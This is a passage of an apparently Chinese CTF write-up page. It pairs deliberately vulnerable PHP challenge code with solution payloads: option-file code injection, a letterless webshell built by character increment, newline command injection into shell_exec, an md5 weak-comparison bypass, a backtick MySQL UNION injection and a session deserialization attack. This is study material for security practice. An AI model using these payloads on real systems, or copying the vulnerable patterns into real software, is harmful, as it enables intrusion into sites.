class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>]);<br><span class="hljs-variable">$file</span> = file_get_contents(<span class="hljs-string">&#x27;xxxxx/option.php&#x27;</span>);<br><span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="hljs-string">&quot;\$option=&#x27;<span class="hljs-subst">$str</span>&#x27;;&quot;</span>, <span class="hljs-variable">$file</span>);<br>file_put_contents(<span class="hljs-string">&#x27;xxxxx/option.php&#x27;</span>, <span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>解法</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">?<span class="hljs-keyword">option</span>=aaa&#x27;;%<span class="hljs-number">0</span>aphpinfo();<span class="hljs-comment">//</span><br>?<span class="hljs-keyword">option</span>=aaa\&#x27;;phpinfo();<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><h2 id="PHP-无数字无字母webshell"><a href="#PHP-无数字无字母webshell" class="headerlink" title="PHP 无数字无字母webshell"></a>PHP 无数字无字母webshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;On&quot;</span>);<br>error_reporting(E_ALL | E_STRICT);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>   show_source(<span class="hljs-keyword">__FILE__</span>);<br>   <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rand_string</span>(<span class="hljs-params"> <span class="hljs-variable">$length</span> </span>) </span>&#123;<br>   <span class="hljs-variable">$chars</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;    <br>   <span class="hljs-variable">$size</span> = strlen( <span class="hljs-variable">$chars</span> );<br>   <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>   <span class="hljs-keyword">for</span>( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$id</span>+ ) &#123;<br>   <span class="hljs-variable">$str</span> .= <span class="hljs-variable">$chars</span>[ rand( <span class="hljs-number">0</span>, <span class="hljs-variable">$size</span> - <span class="hljs-number">1</span> ) ];<br>   &#125;<br>   <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$black_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$black_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br>   <span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$b</span>) !== <span class="hljs-literal">false</span>)&#123;<br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;WAF!&quot;</span>);<br>   &#125;<br>&#125;<br><span class="hljs-variable">$filename</span>=rand_string(<span class="hljs-number">0x20</span>).<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-variable">$folder</span>=<span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><span class="hljs-variable">$full_filename</span> = <span class="hljs-variable">$folder</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">if</span>(file_put_contents(<span class="hljs-variable">$full_filename</span>, <span class="hljs-string">&#x27;&lt;?php &#x27;</span>.<span class="hljs-variable">$data</span>))&#123;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;&quot;</span>.<span class="hljs-variable">$full_filename</span>.<span class="hljs-string">&quot;&#x27;&gt;WebShell&lt;/a&gt;&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Enjoy your webshell~&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Some thing wrong...&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp 利用php字符自增特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].[]; <span class="hljs-comment">//ArrayArray</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;&#x27;</span>];  <span class="hljs-comment">//A</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;  <span class="hljs-comment">//B</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// E</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>; <span class="hljs-comment">// GE</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// GET var_dump($&#123;&#x27;_&#x27;.$__&#125;[_]($&#123;&#x27;_&#x27;.$__&#125;[__])); // $_GET[&quot;_&quot;]($_GET[&quot;__&quot;]);</span><br></code></pre></td></tr></table></figure><h2 id="PHP-shell-exec接受换行符引发代码注入"><a href="#PHP-shell-exec接受换行符引发代码注入" class="headerlink" title="PHP shell_exec接受换行符引发代码注入"></a>PHP shell_exec接受换行符引发代码注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ])) &#123;<br>    <span class="hljs-variable">$target</span> = trim(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ]);<br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;|&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br>    <span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br>    <span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$target</span>;<br>    <span class="hljs-keyword">echo</span>  <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>这个地方 $target可控 可以通过换行符实现恶意代码的注入</p><p>构建</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=127.0.0.1%0als<br></code></pre></td></tr></table></figure><h2 id="PHP-md5弱类型比较"><a href="#PHP-md5弱类型比较" class="headerlink" title="PHP md5弱类型比较"></a>PHP md5弱类型比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-variable">$content</span> = preg_replace(<span class="hljs-string">&#x27;/FLAG\-[0-9a-zA-Z_?!.,]+/i&#x27;</span>, <span class="hljs-string">&#x27;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&#x27;</span>, <span class="hljs-variable">$content</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;code-highlight&quot;&gt;&#x27;</span>;<br>  highlight_string(<span class="hljs-variable">$content</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[^\W_]+$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;Don&#x27;t hack me please :(&quot;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$pass</span> = md5(<span class="hljs-string">&quot;admin1674227342&quot;</span>);<br>    <span class="hljs-keyword">if</span> (((((((((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] == <span class="hljs-variable">$pass</span>)))) &amp;&amp; ((((<span class="hljs-variable">$pass</span> !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))))) || (((((<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])))) &amp;&amp; (((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] !== <span class="hljs-variable">$pass</span>)))))))) &#123; <span class="hljs-comment">// Trolling u lisp masta</span><br>      <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$pass</span>) == strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;&lt;div class=&#x27;alert alert-success&#x27;&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;&quot;</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;&lt;div class=&#x27;alert alert-danger&#x27;&gt;Wrong password&lt;/div&gt;&quot;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;&lt;div class=&#x27;alert alert-danger&#x27;&gt;Wrong password&lt;/div&gt;&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>主要看 &#x3D;&#x3D; 弱类型比较，所以 0exx &#x3D;&#x3D;0eyy，只要再取一个md5以0e开头就可以了</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br></code></pre></td></tr></table></figure><h2 id="Mysql-96-96-保留字符注入"><a href="#Mysql-96-96-保留字符注入" class="headerlink" title="Mysql &#96;&#96;保留字符注入"></a>Mysql &#96;&#96;保留字符注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-variable">$table</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table&#x27;</span>]?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table&#x27;</span>]:<span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-variable">$table</span> = Filter(<span class="hljs-variable">$table</span>);<br>mysqli_query(<span class="hljs-variable">$mysqli</span>,<span class="hljs-string">&quot;desc `secret_<span class="hljs-subst">&#123;$table&#125;</span>`&quot;</span>) <span class="hljs-keyword">or</span> Hacker();<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select &#x27;flag&#123;xxx&#125;&#x27; from secret_<span class="hljs-subst">&#123;$table&#125;</span>&quot;</span>;<br><span class="hljs-variable">$ret</span> = sql_query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ret</span>[<span class="hljs-number">0</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Mysql中存在一个 &#96;&#96; 目的是区分 保留字符 和 普通字符</p><p>demo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select `from` from test <br></code></pre></td></tr></table></figure><p>通过 反引号的闭合 我们发现这样可以构造Sql注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?table=flag` `<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这等同于</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mysqli_query</span><span class="hljs-params">(<span class="hljs-variable">$mysqli</span>,<span class="hljs-string">&quot;desc `secret_flag` `union select database()`&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>这样 flag和 union中间的内容被解释为 空格</p><p>最终的payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?table=flag` `<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(flagUwillNeverKnow) <span class="hljs-keyword">from</span> secret_flag <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203062331018.png" alt="image-20220306233134882"></p><h2 id="PHP-不同序列化引擎导致的反序列化问题"><a href="#PHP-不同序列化引擎导致的反序列化问题" class="headerlink" title="PHP 不同序列化引擎导致的反序列化问题"></a>PHP 不同序列化引擎导致的反序列化问题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>   <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>   &#125;<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>   <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>   &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>   <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>   highlight_string(file_get_contents(<span class="hljs-string">&#x27;index.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先传入一个 <code>?phpinfo=1</code></p><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>session.serialize_handler</td><td>php</td><td>php_serialize</td></tr><tr><td>session.upload_progress.enabled</td><td>On</td><td>On</td></tr><tr><td>SERVER[“DOCUMENT_ROOT”]</td><td>&#x2F;opt&#x2F;lampp&#x2F;htdocs</td><td></td></tr></tbody></table><p>可以发现这里实际上使用的序列化引擎是php</p><table><thead><tr><th><strong>php_serialize</strong></th><th>经过serialize()函数序列化数组</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize()函数处理的值</td></tr></tbody></table><p>​    不难看出 这个地方 如果传入 | xxx 的话 在php引擎里会被当做分隔符 进而在后续过程中被反序列化。结合上面开启了 session.upload_progress 所以可以通过文件上传一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据</p><p>于是构建一个文件上传页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>随后构建序列化脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>=<span class="hljs-string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> OowoO();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$obj</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span><br><span class="hljs-comment">//防止转义</span><br><span 